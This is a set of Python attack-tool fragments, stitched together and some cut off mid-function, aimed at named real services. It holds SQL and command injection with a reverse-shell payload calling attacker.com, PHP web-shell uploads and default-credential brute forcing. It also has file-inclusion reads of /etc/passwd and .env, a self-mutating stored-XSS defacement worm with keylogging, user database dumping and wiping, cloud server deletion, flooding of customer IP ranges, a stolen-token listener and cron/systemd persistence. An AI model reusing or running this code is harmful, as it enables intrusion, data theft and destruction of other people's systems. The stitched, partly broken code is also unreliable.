            stats["failed_requests"] += 1
        return None

def test_connection():
    """Test if target is reachable using cloudscraper."""
    log_info("Testing connection...")
    try:
        s = get_scraper()
        r = s.get(BASE_URL, timeout=10)
        if r.status_code in [200, 403, 503]:
            log_success(f"Connection successful (status {r.status_code})")
            return True
        else:
            log_error(f"Unexpected status: {r.status_code}")
            return False
    except Exception as e:
        log_error(f"Connection error: {str(e)}")
        return False

def sql_injection_worker(payload, category):
    url = f"{BASE_URL}/search?q={urllib.parse.quote(payload)}"
    r = safe_request(url, timeout=10)
    if not r:
        return None
    if r.status_code == 200:
        if category == "time_based" and r.elapsed.total_seconds() > 4:
            return {"payload": payload, "category": category, "type": "time"}
        if any(err in r.text.lower() for err in ["error", "mysql", "sql", "syntax", "warning", "mysqli", "pdoexception"]):
            with open("sql_errors.txt", "a") as f:
                f.write(f"{payload}\n{r.text[:500]}\n\n")
            return {"payload": payload, "category": category, "type": "error"}
        if "INTO OUTFILE" in payload:
            if "index.html" in payload:
                check = safe_request(f"{BASE_URL}/index.html", timeout=5)
                if check and check.status_code == 200 and "FROZEN" in check.text:
                    with stats_lock:
                        stats["file_uploaded"] += 1
                    return {"payload": payload, "category": "file_write", "type": "index.html"}
            if "shell.php" in payload:
                check = safe_request(f"{BASE_URL}/shell.php?cmd=id", timeout=5)
                if check and check.status_code == 200 and "uid=" in check.text:
                    with stats_lock:
                        stats["file_uploaded"] += 1
                    return {"payload": payload, "category": "file_write", "type": "shell"}
    return None

def sql_injection():
    log_info("Starting SQL injection attacks...")
    found = []
    with ProcessPoolExecutor(max_workers=MAX_PROCESSES) as executor:
        futures = []
        for category, payloads in SQLI_PAYLOADS.items():
            for payload in payloads:
                futures.append(executor.submit(sql_injection_worker, payload, category))
        for future in as_completed(futures):
            result = future.result()
            if result:
                log_success(f"SQLi found: {result['type']} - {result['payload'][:50]}")
                found.append(result)
                with stats_lock:
                    stats["sqli_found"] += 1
    return found

# ============================================================
# COMMAND INJECTION
# ============================================================
CMD_PAYLOADS = [
    ";id", "|id", "`id`", "$(id)", "&id",
    ";whoami", "|whoami", "`whoami`", "$(whoami)", "&&whoami",
    ";ls -la", "|ls -la",
    ";cat /etc/passwd", "|cat /etc/passwd",
    ";echo 'frozen' > /tmp/test", "|echo 'frozen' > /tmp/test",
    ";nc -e /bin/sh attacker.com 4444", "|nc -e /bin/sh attacker.com 4444",
]

def cmd_injection_worker(param, payload):
    url = f"{BASE_URL}/search?{param}={urllib.parse.quote(payload)}"
    r = safe_request(url, timeout=5)
    if not r:
        return None
    if r.status_code == 200:
        if "uid=" in r.text or "root" in r.text or "www-data" in r.text:
            with open("cmd_output.txt", "a") as f:
                f.write(f"{param}={payload}\n{r.text[:500]}\n\n")
            return {"param": param, "payload": payload, "output": r.text[:200]}
    return None

def command_injection():
    log_info("Testing command injection...")
    found = []
    params = ["q", "s", "search", "id", "page", "view"]
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for param in params:
            for payload in CMD_PAYLOADS:
                futures.append(executor.submit(cmd_injection_worker, param, payload))
        for future in as_completed(futures):
            result = future.result()
            if result:
                log_success(f"Command injection found: {result['param']}={result['payload']}")
                log_info(f"Output: {result['output']}")
                found.append(result)
                with stats_lock:
                    stats["cmd_found"] += 1
    return found

# ============================================================
# FILE UPLOAD
# ============================================================
def file_upload():
    log_info("Attempting file upload to /upload...")
    upload_payloads = [
        ("shell.php", "<?php system($_GET['cmd']); ?>"),
        ("backdoor.php", "<?php eval($_POST['c']); ?>"),
        ("index.html", "<h1>FROZEN</h1>"),
    ]
    for filename, content in upload_payloads:
        files = {'file': (filename, content, 'text/plain')}
        r = safe_request(f"{BASE_URL}/upload", method='POST', files=files, timeout=10)
        if not r:
            continue
        if r.status_code == 200:
            log_success(f"File uploaded: {filename}")
            with stats_lock:
                stats["file_uploaded"] += 1
            for path in [f"/uploads/{filename}", f"/files/{filename}", f"/{filename}"]:
                check = safe_request(f"{BASE_URL}{path}", timeout=5)
                if check and check.status_code == 200:
                    log_success(f"Uploaded file accessible at {path}")
                    return True
        time.sleep(0.5)
    return False

# ============================================================
# ADMIN PANEL
# ============================================================
ADMIN_PATHS = [
    "/admin", "/administrator", "/cp", "/cpanel", "/dashboard",
    "/manager", "/panel", "/staff", "/control", "/login",
    "/manage", "/superadmin", "/root", "/backend", "/admincp",
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("root", "root"), ("admin", "password"),
    ("administrator", ""), ("user", "user"), ("admin", "123456"),
]

def admin_panel_worker(path):
    url = f"{BASE_URL}{path}"
    r = safe_request(url, timeout=5, allow_redirects=False)
    if not r:
        return None
    if r.status_code in [200, 302, 401, 403]:
        for user, passwd in DEFAULT_CREDS:
            login_data = {"username": user, "password": passwd, "login": "1"}
            r2 = safe_request(url, method='POST', data=login_data, timeout=5, allow_redirects=False)
            if r2 and r2.status_code in [302, 200]:
                return {"url": url, "creds": f"{user}:{passwd}", "status": r2.status_code}
        return {"url": url, "status": r.status_code}
    return None

def admin_panel_scan():
    log_info("Scanning for admin panels...")
    found = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(admin_panel_worker, path) for path in ADMIN_PATHS]
        for future in as_completed(futures):
            result = future.result()
            if result:
                if "creds" in result:
                    log_success(f"Admin panel with creds: {result['url']} - {result['creds']}")
                    with stats_lock:
                        stats["admin_found"] += 1
                else:
                    log_success(f"Admin panel found: {result['url']} (status {result['status']})")
                    with stats_lock:
                        stats["admin_found"] += 1
                found.append(result)
    return found

    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../var/log/apache2/access.log",
    "../../../../var/www/html/index.php",
    "../../../../.htaccess",
    "../../../../.env",
]

def lfi_scan():
    log_info("Attempting local file inclusion...")
    for path in LFI_PAYLOADS:
        url = f"{BASE_URL}/search?q={urllib.parse.quote(path)}"
        r = safe_request(url, timeout=5)
        if r and r.status_code == 200:
            if "root:" in r.text or "daemon:" in r.text:
                log_success(f"File read possible: {path}")
                with open("lfi_results.txt", "a") as f:
                    f.write(f"{path}\n{r.text[:500]}\n\n")
                with stats_lock:
                    stats["lfi_found"] += 1
        time.sleep(0.2)

def xss_to_stored(session_token=None):
    if not session_token:
        log_warning("No session token provided, skipping stored XSS.")
        return None
    log_info("Generating reflected XSS to stored XSS exploit URL...")
    scraper = cloudscraper.create_scraper()
    scraper.cookies.set('session', session_token, domain='doxbin.com')
    deface_html = "<h1 style=\"color:red;font-size:80px;text-align:center;margin-top:20%\">FROZEN</h1>"
    js_payload = f"""
    (async function() {{
        const html = `{deface_html}`;
        await fetch('/settings', {{
            method: 'POST',
            headers: {{'Content-Type':'application/x-www-form-urlencoded'}},
            body: `bio=${{encodeURIComponent(html)}}&description=${{encodeURIComponent(html)}}`
        }});
        let userId = document.body.innerText.match(/ID\\s*(\\d+)/)?.[1] || '636092';
        await fetch('/api/user/comment/create', {{
            method: 'POST',
            headers: {{'Content-Type':'application/x-www-form-urlencoded'}},
            body: `user_id=${{userId}}&message=${{encodeURIComponent('<script>' + html + '</script>')}}`
        }});
        await fetch('/upload', {{
            method: 'POST',
            headers: {{'Content-Type':'application/x-www-form-urlencoded'}},
            body: `title=FROZEN&content=${{encodeURIComponent('<script>' + html + '</script>')}}&syntax=html`
        }});
    }})();
    """
    payload = f"<script>{js_payload}</script>"
    exploit_url = f"{BASE_URL}/search?q={urllib.parse.quote(payload)}"
    log_info(f"Exploit URL (send to logged-in user): {exploit_url}")
    return exploit_url

# MAIN
# ============================================================
def main():
    global PROXY, USE_PROXY, SESSION_TOKEN
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--proxy", help="Proxy (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy")
    parser.add_argument("--token", help="Session token")
    args = parser.parse_args()

    if args.no_proxy:
        USE_PROXY = False
        PROXY = None
    elif args.proxy:
        PROXY = args.proxy
        USE_PROXY = True
    else:
        USE_PROXY = False

    if args.token:
        SESSION_TOKEN = args.token

    print("""
╔═══════════════════════════════════════════════════════════════════╗
║ WHAT A FREEZE - ULTIMATE DESTRUCTION ENGINE v2.1                 ║
║ - Better Cloudflare bypass                                       ║
║ - Multi-processing + threading                                   ║
║ - Stealth & evasion                                              ║
║ - Live stats                                                     ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    if USE_PROXY and PROXY:
        log_info(f"Using proxy: {PROXY}")
    else:
        log_info("Using direct connection.")

    # Start stats thread
    stats_thread = threading.Thread(target=stats_updater, daemon=True)
    stats_thread.start()

    # Test connection
    if not test_connection():
        if USE_PROXY:
            log_warning("Proxy connection failed. Trying without proxy...")
            USE_PROXY = False
            PROXY = None
            if not test_connection():
                log_error("Cannot reach target. Check network.")
                sys.exit(1)
        else:
            log_error("Cannot reach target. Check network.")
            sys.exit(1)

    # Run attacks
    log_info("Launching all attacks...")
    results = {}

    results["sql_injection"] = sql_injection()
    results["command_injection"] = command_injection()
    results["file_upload"] = file_upload()
    results["admin_panels"] = admin_panel_scan()
    if SESSION_TOKEN:
        results["xss_stored_url"] = xss_to_stored(SESSION_TOKEN)
    else:
        log_warning("No session token – skipping stored XSS injection.")
        results["xss_stored_url"] = None
    lfi_scan()

    # Report
    print("\n")
    log_info("Attack sequence completed.")
    log_info("Results:")
    for key, value in results.items():
        if isinstance(value, list):
            log_info(f"  {key}: {len(value)} findings")
        else:
            log_info(f"  {key}: {value}")

    log_success("All done. Check logs for details.")

if __name__ == "__main__":
    mp.set_start_method('spawn', force=True)
    main()

    def mutate_payload(self, payload):
        mutations = [
            self._add_obfuscation,
            self._add_stealth_delay,
            self._add_propagation,
            self._add_persistence,
            self._add_redirect,
            self._add_fake_alert,
            self._add_keylogger,
            self._add_webgl_fingerprint,
        ]
        
        selected = random.sample(mutations, random.randint(1, 3))
        for mutation in selected:
            payload = mutation(payload)
        
        return payload
    
    def _add_obfuscation(self, payload):
        encoded = base64.b64encode(payload.encode()).decode()
        return f'<script>eval(atob("{encoded}"))</script>'
    
    def _add_stealth_delay(self, payload):
        return f'<script>setTimeout(function() {{ {payload.replace("<script>", "").replace("</script>", "")} }}, {random.randint(500, 3000)});</script>'

    def test_injection(self, injection_point, payload):
        point = self.injection_points[injection_point]
        
        if injection_point == "bios":
            data = {"field": point["field"], "value": payload}
        elif injection_point == "announcements":
            data = {"title": f"SYSTEM FREEZE {self.generation}", "content": payload, "permanent": True}
        elif injection_point == "tickets":
            data = {"subject": f"System Notice {self.generation}", "message": payload}
        elif injection_point == "notifications":
            data = {"message": payload, "broadcast": True}
        elif injection_point == "profile":
            data = {"notes": payload}
        else:
            return False
        
        try:
            if injection_point == "profile":
                r = requests.put(point["url"], headers=self.headers, json=data, timeout=10)
            else:
                r = requests.post(point["url"], headers=self.headers, json=data, timeout=10)
            
            if r.status_code == 200:
                point["success_count"] += 1
                self.successful_payloads.append({"point": injection_point, "payload": payload, "generation": self.generation})
                return True
            else:
                point["fail_count"] += 1
                self.failed_payloads.append({"point": injection_point, "payload": payload, "code": r.status_code})
                return False
        except:
            point["fail_count"] += 1
            return False
    
    def evolve(self):
        print(f"\n[EVOLVE] Generation {self.generation} - Learning from results...")
        
        if self.successful_payloads:
            print(f"[LEARN] {len(self.successful_payloads)} successful payloads identified")
            best_payloads = self.successful_payloads[-10:]
            for bp in best_payloads:
                new_payload = self.mutate_payload(bp["payload"])
                self.payloads.append(new_payload)
        
        if not self.payloads:
            for i in range(1, 4):
                self.payloads.append(self.generate_base_payload(i))
        
        injection_order = sorted(self.injection_points.keys(), 
                                key=lambda x: self.injection_points[x]["success_count"] - self.injection_points[x]["fail_count"], 
                                reverse=True)
        
        return injection_order
    
    def run(self):
        print("""
        ╔══════════════════════════════════════════════════════════════════╗
        ║     GHOST APOCALYPSE - EVOLVING XSS MUTATOR                      ║
        ║     WHAT_A_FREEZE - ADAPTIVE PERMANENT TAKEOVER                  ║
        ║                                                                  ║
        ║     The longer it runs, the more effective it becomes.           ║
        ║     Payloads evolve. Injection points adapt.                     ║
        ║     Every generation learns from the last.                       ║
        ║                                                                  ║
        ╚══════════════════════════════════════════════════════════════════╝
        """)
        
        while True:
            injection_order = self.evolve()
            
            for injection_point in injection_order:
                for payload in self.payloads[:5]:
                    self.test_injection(injection_point, payload)
                    self.total_injections += 1
                    time.sleep(random.uniform(0.5, 2))
            
            self.generation += 1
            
            print(f"""
            [STATUS] Generation {self.generation} complete
            [STATS] Total injections: {self.total_injections}
            [STATS] Successful payloads: {len(self.successful_payloads)}
            [STATS] Failed payloads: {len(self.failed_payloads)}
            [STATS] Active injection points: {len([p for p in self.injection_points.values() if p['success_count'] > 0])}
            """)
            
            time.sleep(30)

def dump_user_database():
    print("[DUMP] Extracting all user data...")
    headers = {"Authorization": f"Bearer {JWT}"}
    
    endpoints = [
        "/api/admin/customers",
        "/api/users",
        "/api/customers/all",
        "/api/admin/users/list",
        "/api/billing/customers",
    ]
    
    all_data = []
    for endpoint in endpoints:
        try:
            r = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                all_data.append(data)
                print(f"[DUMP] Extracted from {endpoint}: {len(str(data))} bytes")
                
                with open(f"/tmp/user_dump_{int(time.time())}.json", "w") as f:
                    json.dump(data, f, indent=2)
        except:
            pass
    
    return all_data

def wipe_database():
    print("[WIPE] Attempting destructive operations...")
    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
    
    destructive_ops = [
        ("DELETE", "/api/admin/users/all"),
        ("DELETE", "/api/customers/batch"),
        ("POST", "/api/admin/database/purge"),
        ("DELETE", "/api/servers/all"),
        ("POST", "/api/admin/reset", {"confirm": "YES_DESTROY_EVERYTHING"}),
    ]
    
    for method, endpoint, *data in destructive_ops:
        try:
            if data:
                r = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers, json=data[0], timeout=5)
            else:
                r = requests.request(method, f"{BASE_URL}{endpoint}", headers=headers, timeout=5)
            print(f"[WIPE] {method} {endpoint} -> {r.status_code}")
        except:
            pass

def get_openstack_token():
    """Get OpenStack authentication token"""
    try:
        r = requests.post(
            f"{OPENSTACK['auth_url']}/auth/tokens",
            json={
                "auth": {
                    "identity": {
                        "methods": ["password"],
                        "password": {
                            "user": {
                                "name": OPENSTACK["username"],
                                "domain": {"name": OPENSTACK["domain"]},
                                "password": OPENSTACK["password"]
                            }
                        }
                    },
                    "scope": {
                        "project": {
                            "name": OPENSTACK["project"],
                            "domain": {"name": OPENSTACK["domain"]}
                        }
                    }
                }
            },
            timeout=10
        )
        return r.headers.get("X-Subject-Token")
    except:
        return None

def delete_all_servers(token):
    """Delete every customer VPS"""
    headers = {"X-Auth-Token": token}
    try:
        r = requests.get(f"{OPENSTACK['auth_url']}/v2.1/servers/detail", headers=headers, timeout=10)
        servers = r.json().get("servers", [])
        for server in servers:
            try:
                requests.delete(f"{OPENSTACK['auth_url']}/v2.1/servers/{server['id']}", headers=headers, timeout=5)
                print(f"[OPENSTACK] Deleted server: {server['id']}")
            except:
                pass
    except:
        pass

def delete_all_volumes(token):

def create_persistence():

    cron_line = f"@reboot python3 {script_path} > /dev/null 2>&1 &"
    
    # Add to crontab
    try:
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
        print("[PERSISTENCE] Added to crontab")
    except:
        pass
    
    # Add to systemd
    service_content = f"""[Unit]
Description=Ghost Annihilator
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    try:
        with open("/etc/systemd/system/ghost.service", "w") as f:
            f.write(service_content)
        subprocess.run("systemctl enable ghost.service && systemctl start ghost.service", shell=True)
        print("[PERSISTENCE] Added to systemd")
    except:
        pass

def syn_rst_flood(ip, port=22):
    try:
        sock = socket.socket()
        sock.settimeout(0.02)
        sock.connect((ip, port))
        sock.send(b"\x00" * 8 + b"\xff" * 16)
        for _ in range(20):
            sock.send(b"SSH-2.0-OpenSSH_9.5\r\n")
        sock.close()
        return True
    except:
        return False

def multi_port_assault(ip):
    for port in random.sample(INTERNAL_PORTS, 5):
        try:
            syn_rst_flood(ip, port)
        except:
            pass
    return True

def state_table_exhaustion():
    print("[ATTACK] Starting state table exhaustion on upstream gateways")
    targets = GATEWAYS + TARGET_IPS[:20]
    
    def worker():
        while True:
            for ip in targets:
                syn_rst_flood(ip)
                multi_port_assault(ip)
            time.sleep(0.05)
    
    for _ in range(100):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
    
    print("[ATTACK] State table exhaustion running on 100 threads")

            except Exception as e:
                print(f"[FAILED] Injection error: {e}")

# ============================================================
# 4. RATE LIMITER SUICIDE (Asset Flood)
# ============================================================

def rate_limiter_suicide():
    print("[ATTACK] Triggering rate limiter suicide")
    
    assets = [
        "/assets/logo_white.svg", "/assets/LV.png", "/assets/USA.svg",
        "/assets/SG.png", "/assets/HK.png", "/assets/FR.png"
    ]
    
    def flood_asset(asset):
        for _ in range(500):
            try:
                requests.get(f"{TARGET_BASE}{asset}", timeout=1)
            except:
                pass
    
    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(flood_asset, assets * 10)
    
    print("[ATTACK] Rate limiter should now be blocking static assets")

# ============================================================
# 5. OPENSTACK CLOUD DELETION
# ============================================================

def delete_openstack():
    print("[ATTACK] Attempting OpenStack cloud deletion")
    
    try:
        resp = requests.post(
            "https://os-api.hostvds.com:4430/v3/auth/tokens",
            json={"auth": {"identity": {"methods": ["password"], "password": {"user": {"name": "admin", "domain": {"id": "default"}, "password": "password"}}}}
        )
        token = resp.headers.get("X-Subject-Token")
        
        if token:
            instances = requests.get("https://os-api.hostvds.com:4430/v2.1/servers/detail", headers={"X-Auth-Token": token})
            for server in instances.json().get("servers", []):
                requests.delete(f"https://os-api.hostvds.com:4430/v2.1/servers/{server['id']}", headers={"X-Auth-Token": token})
            print("[SUCCESS] OpenStack VPS instances deleted")
    except Exception as e:
        print(f"[FAILED] OpenStack attack: {e}")

# ============================================================
# 6. JWT HARVESTER (Session Theft)
# ============================================================

def start_token_listener():
    print("[ATTACK] Starting JWT token listener on port 9000")
    
    import http.server
    import urllib.parse
    
    class TokenHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args): pass
        def do_GET(self):
            if "?token=" in self.path:
                token = self.path.split("?token=")[1]
                token = urllib.parse.unquote(token)
                filename = f"/tmp/stolen_tokens/token_{int(time.time())}.txt"
                with open(filename, "w") as f:
                    f.write(token)
                print(f"[JWT STOLEN] {token[:80]}...")
            self.send_response(200)
            self.end_headers()
    
    os.makedirs("/tmp/stolen_tokens", exist_ok=True)
    server = http.server.HTTPServer(("0.0.0.0", 9000), TokenHandler)
    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()

# ============================================================
# 7. CUSTOMER VPS SATURATION
# ============================================================

def saturate_customers():
    print("[ATTACK] Saturating customer VPS ranges")
    
    targets = []
    for cidr in TARGET_RANGES:
        net = ip_network(cidr)
        for ip in list(net.hosts())[:100]:
            targets.append(str(ip))
    
    def worker(targets):
        while True:
            for ip in targets:
                for port in [22, 80, 443]:
                    try:
                        sock = socket.socket()
                        sock.settimeout(0.01)
                        sock.connect((ip, port))
                        sock.send(b"\x00" * 1024)
                        sock.close()
                    except:
                        pass
            time.sleep(0.1)
    
    for _ in range(50):
        t = threading.Thread(target=worker, args=(targets[:50],))
        t.daemon = True
        t.start()
    
    print("[ATTACK] Customer saturation running on 50 threads")

        print("[SUCCESS] Webhook system hijacked")
    except:

# ============================================================
# 9. PERSISTENCE INSTALLATION
# ============================================================

def install_persistence():
    print("[ATTACK] Installing persistence on VPS")
    
    script_path = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {script_path} --persist\n"
    
    try:
        with open("/tmp/cron_add", "w") as f:
            f.write(cron_line)
        os.system("crontab /tmp/cron_add 2>/dev/null")
        print("[SUCCESS] Cron persistence installed")
    except:
        pass
    
    service_content = f"""[Unit]
Description=Ghost Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
    try:
        with open("/etc/systemd/system/ghost.service", "w") as f:
            f.write(service_content)
        os.system("systemctl daemon-reload && systemctl enable ghost.service 2>/dev/null")
        print("[SUCCESS] Systemd persistence installed")
    except:
        pass

# 10. MAIN BURST EXECUTION
# ============================================================

def main():
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     GHOST APOCALYPSE - WHAT_A_FREEZE - TOTAL TAKEOVER            ║
    ║     Executing ALL confirmed exploits in parallel                 ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    start_token_listener()
    time.sleep(1)
    
    attack_threads = [
        threading.Thread(target=state_table_exhaustion),
        threading.Thread(target=create_admin_accounts),
        threading.Thread(target=inject_worm),
        threading.Thread(target=rate_limiter_suicide),
        threading.Thread(target=saturate_customers),
        threading.Thread(target=delete_openstack),
        threading.Thread(target=hijack_webhooks)
    ]
    
    for t in attack_threads:
        t.start()
    
    if "--persist" in sys.argv:
        install_persistence()
    
    print("[STATUS] All attacks running. Press Ctrl+C to stop but persistence remains.")
    print("[STATUS] JWT listener on port 9000. Stolen tokens saved to /tmp/stolen_tokens/")
    
    try:
        while True:
            time.sleep(60)
            token_count = len(os.listdir("/tmp/stolen_tokens")) if os.path.exists("/tmp/stolen_tokens") else 0
            print(f"[STATUS] Tokens stolen so far: {token_count}")
    except KeyboardInterrupt:
        print("\n[STATUS] Attack burst complete. The damage is done. WHAT_A_FREEZE.")

if __name__ == "__main__":
    main()
